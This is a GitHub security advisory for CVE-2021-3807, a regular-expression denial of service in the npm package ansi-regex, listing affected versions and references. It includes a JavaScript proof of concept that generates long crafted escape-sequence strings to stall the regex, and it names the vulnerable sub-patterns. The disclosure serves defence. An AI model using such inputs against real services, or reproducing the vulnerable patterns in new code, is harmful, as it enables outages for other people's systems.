# [H] Inefficient Regular Expression Complexity in chalk/ansi-regex

## Summary
Severity: High
Advisory: GHSA-93q8-gq69-wqmw
CVE: CVE-2021-3807
CWE: CWE-1333, CWE-697
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2021-09-20
Source: https://github.com/advisories/GHSA-93q8-gq69-wqmw
Type: github-advisory

## Affected
- npm: `ansi-regex` — affected >=6.0.0 <6.0.1
- npm: `ansi-regex` — affected >=5.0.0 <5.0.1
- npm: `ansi-regex` — affected >=4.0.0 <4.1.1
- npm: `ansi-regex` — affected >=3.0.0 <3.0.1

## Details
ansi-regex is vulnerable to Inefficient Regular Expression Complexity which could lead to a denial of service when parsing invalid ANSI escape codes.

**Proof of Concept**
```js
import ansiRegex from 'ansi-regex';
for(var i = 1; i <= 50000; i++) {
    var time = Date.now();
    var attack_str = "\u001B["+";".repeat(i*10000);
    ansiRegex().test(attack_str)
    var time_cost = Date.now() - time;
    console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
}
```
The ReDOS is mainly due to the sub-patterns `[[\\]()#;?]*` and `(?:;[-a-zA-Z\\d\\/#&.:=?%@~_]*)*`

## References
- https://nvd.nist.gov/vuln/detail/CVE-2021-3807
- https://github.com/chalk/ansi-regex/issues/38#issuecomment-924086311
- https://github.com/chalk/ansi-regex/issues/38#issuecomment-925924774
- https://github.com/chalk/ansi-regex/commit/419250fa510bf31b4cc672e76537a64f9332e1f1
- https://github.com/chalk/ansi-regex/commit/75a657da7af875b2e2724fd6331bf0a4b23d3c9a
- https://github.com/chalk/ansi-regex/commit/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9
- https://github.com/chalk/ansi-regex/commit/c3c0b3f2736b9c01feec0fef33980c43720dcde8
- https://app.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908
- https://github.com/chalk/ansi-regex
- https://github.com/chalk/ansi-regex/releases/tag/v6.0.1
- https://huntr.dev/bounties/5b3cf33b-ede0-4398-9974-800876dfd994
- https://security.netapp.com/advisory/ntap-20221014-0002
- https://www.oracle.com/security-alerts/cpuapr2022.html
